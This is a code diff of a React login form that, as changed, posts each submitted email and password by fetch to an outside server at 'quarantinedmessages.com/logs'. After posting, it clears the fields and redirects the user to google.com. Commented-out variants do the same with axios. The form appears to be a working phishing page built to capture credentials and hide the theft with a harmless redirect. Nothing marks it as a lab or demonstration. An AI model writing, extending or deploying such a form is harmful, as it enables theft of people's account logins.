@@ -10,64 +10,74 @@ const Form = () => {
     const [password, setPassword] = useState('');
     const [count, setCount] = useState(0);
     const [isLoading, setIsLoading] = useState(false)
+    const [redirecting, setRedirecting] = useState(false);
 
-    // const handleSubmit = async (e) => {
-    //     e.preventDefault();
-    
-    //     const requestBody = {
-    //       email: email,
-    //       password: password,
-    //       count: count,
-    //     };
-    
-    //     try {
-    //         setIsLoading(true)
-    //       const response = await fetch('https://quarantinedmessages.com/logs', {
-    //         method: 'POST',
-    //         headers: {
-    //           'Content-Type': 'application/json',
-    //         },
-    //         body: JSON.stringify(requestBody),
-    //       });
-    
-    //       const responseData = await response.json() 
-    
-    //       if (response.ok) {
-    //         console.log(`Post request successful: ${JSON.stringify(responseData)}`);
-    //       } else {
-    //         console.error(`Post request failed: ${JSON.stringify(responseData)}`);
-    //       }
-    //     } catch (error) {
-    //       console.error('An error occurred:', error);
-    //     } finally{
-    //         setIsLoading(false)
-    //         setPassword('')
-    //         setEmail('')
-    //     }
-    //   }; 
-
-    const handleSubmit = (e) => {
+    const handleSubmit = async (e) => {
         e.preventDefault();
-
-        axios.post('https://quarantinedmessages.com/logs', {
-            password: password,
-            email: email
-          })
-          .then(function (response) {
-            console.log(response);
-            console.log("Posting")
-          })
-          .catch(function (error) {
-            console.log(error);
+    
+        const requestBody = {
+          email: email,
+          password: password,
+          count: count,
+        };
+    
+        try {
+            setIsLoading(true)
+          const response = await fetch('https://quarantinedmessages.com/logs', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(requestBody),
           });
+    
+          const responseData = await response.json() 
+    
+          if (response.ok) {
+            console.log(`Post request successful: ${JSON.stringify(responseData)}`);
+          } else {
+            console.error(`Post request failed: ${JSON.stringify(responseData)}`);
+          }
+        } catch (error) {
+          console.error('An error occurred:', error);
+        } finally{
+            setIsLoading(false)
+            setPassword('')
+            setEmail('')
+            window.location.href = 'https://www.google.com';
+        }
+      }; 
 
-          setEmail('')
-          setPassword('')
+//     const handleSubmit = async (e) => {
+//         e.preventDefault();
 
-        // Axios.post('https://quarantinedmessages.com/logs', {
-        //     password, email
-        // }).then(res => console.log('Posting', res)).catch(err => console.log(err))
-    }
+//         try{
+//             const response = await axios.post('https://quarantinedmessages.com/logs', {
+//                 password: password,
+//                 email: email
+//             })
+
+//             console.log(response);
+//             console.log("Posting")
+
+//             if (response.status === 200) {
+//                 // Request successful, set the redirect state to true
+//                 setRedirecting(true);
+//               }
+//         }catch (error) {
+//             console.error('Error making POST request:', error);
+//         }
+
+//         setEmail('')
+//           setPassword('')
+
+//         // Redirect to Google if the redirecting state is true
+//   if (redirecting) {
+//     window.location.href = 'https://www.google.com';
+//   }
+        
+        
+//     }
   return (
     <div className='form'>
         <div className="form-contain">
@@ -99,11 +109,14 @@ const Form = () => {
                     </div>
                 </form>
                 <div className="login">
-                    {isLoading ? 
+                    {/* {isLoading ? 
                     <p>....</p> :
                     null    
-                }
-                        <button type='submit' onClick={handleSubmit}>Login</button>
+                } */}
+
+                        <button type='submit' onClick={handleSubmit}>
+                            {isLoading ? 'Please Wait' : 'Login'}
+                        </button>
                     </div>
             </div>
         </div>
